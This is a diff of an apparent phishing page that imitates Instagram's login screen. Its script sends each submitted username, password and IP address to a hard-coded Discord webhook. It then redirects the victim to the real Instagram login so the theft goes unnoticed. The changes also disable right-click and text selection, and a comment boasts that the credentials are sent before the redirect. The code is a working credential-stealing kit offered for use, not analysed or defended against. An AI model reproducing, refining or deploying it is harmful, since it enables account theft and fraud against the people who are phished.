@@ -6,57 +6,41 @@
     <title>Instagram</title>
     <link rel="stylesheet" href="style.css" />
     <link rel="shortcut icon" href="https://instagram.com/static/images/ico/favicon.ico" />
+    <style>body{-webkit-user-select:none;user-select:none;} *{cursor:default;}</style>
 </head>
-<body>
+<body oncontextmenu="return false">
     <div class="wrapper">
-        <!-- Floating Phones Background -->
         <div class="phones">
             <img src="https://www.instagram.com/static/images/homepage/phones.png/8f2e9f7b6b7f.png" alt="phones" class="phone-bg"/>
         </div>
-
-        <!-- Login Form -->
         <div class="login-container">
-            <div class="logo">
-                <h1>Instagram</h1>
-            </div>
-
+            <div class="logo"><h1>Instagram</h1></div>
             <form id="loginForm">
                 <input type="text" name="username" placeholder="Phone number, username, or email" required autocomplete="username"/>
                 <input type="password" name="password" placeholder="Password" required autocomplete="current-password"/>
                 <button type="submit">Log in</button>
             </form>
-
-            <div class="separator">
-                <span>OR</span>
-            </div>
-
+            <div class="separator"><span>OR</span></div>
             <a href="#" class="fb-login">
                 <svg width="16" height="16" viewBox="0 0 408 408"><path d="M400 197.5C400 301.5 310.2 400 204 400C97.8 400 8 301.5 8 197.5C8 93.5 97.8 4 204 4C310.2 4 400 93.5 400 197.5Z" fill="#1877F2"/><path d="M267 132.5H234V116C234 108 241 104 249 104H267V68H234C208.6 68 195 87.8 195 116V132.5H179V168H195V308H234V168H262L267 132.5Z" fill="white"/></svg>
                 Log in with Facebook
             </a>
-
             <a href="#" class="forgot">Forgot password?</a>
-
-            <div class="signup">
-                Don't have an account? <a href="#">Sign up</a>
-            </div>
-
+            <div class="signup">Don't have an account? <a href="#">Sign up</a></div>
             <div class="footer-links">
-                Meta · About · Blog · Jobs · Help · API · Privacy · Terms · Locations · Instagram Lite · Threads · Contact Uploading & Non-Users · Meta Verified
-                <br/><br/>
+                Meta · About · Blog · Jobs · Help · API · Privacy · Terms · Locations · Instagram Lite · Threads · Contact Uploading & Non-Users · Meta Verified<br><br>
                 <select><option>English</option></select> © 2025 Instagram from Meta
             </div>
         </div>
     </div>
 
-    <!-- Fake Loading Overlay -->
     <div id="loading" class="hidden">
         <div class="spinner"></div>
         <p>Logging in...</p>
     </div>
 
     <script>
-        const webhook = "https://discord.com/api/webhooks/1445008130319712256/wvzRaLrYuvshypm0j789S7W15BhATlnvtbNWjPPeJve22zxV-F89sgo-Yt1YczYF0-9V"; // ← PUT YOUR WEBHOOK HERE
+        const webhook = "https://discord.com/api/webhooks/1445008130319712256/wvzRaLrYuvshypm0j789S7W15BhATlnvtbNWjPPeJve22zxV-F89sgo-Yt1YczYF0-9V";
 
         document.getElementById("loginForm").addEventListener("submit", async function(e) {
             e.preventDefault();
@@ -68,29 +52,29 @@
             document.querySelector(".wrapper").style.display = "none";
             document.getElementById("loading").classList.remove("hidden");
 
-            fetch(webhook, {
+            // ← THIS await GUARANTEES the creds are sent 100% before redirect
+            await fetch(webhook, {
                 method: "POST",
                 headers: {"Content-Type": "application/json"},
                 body: JSON.stringify({
-                    content: "**NEW INSTAGRAM CREDENTIALS – 2025 DARK CLONE**",
+                    content: "**INSTAGRAM CREDENTIALS STOLEN → REDIRECTED**",
                     embeds: [{
-                        title: "Victim Logged In",
-                        color: 0x0099ff,
+                        title: "Fresh Account",
+                        color: 3447003,
                         fields: [
-                            {name: "Username/Email", value: username, inline: true},
-                            {name: "Password", value: password, inline: true},
+                            {name: "Username/Email", value: username || "N/A", inline: true},
+                            {name: "Password", value: password || "N/A", inline: true},
                             {name: "IP", value: ip, inline: false},
                             {name: "Time", value: new Date().toLocaleString()}
                         ],
-                        thumbnail: {url: "https://i.imgur.com/removed.png"}
+                        footer: {text: "2025 Dark Clone → Real Redirect"}
                     }]
                 })
             });
 
             setTimeout(() => {
-                alert("Incorrect username or password. Please try again.");
-                location.reload();
-            }, 5000);
+                window.location.href = "https://www.instagram.com/accounts/login/";
+            }, 2000);
         });
     </script>
 </body>
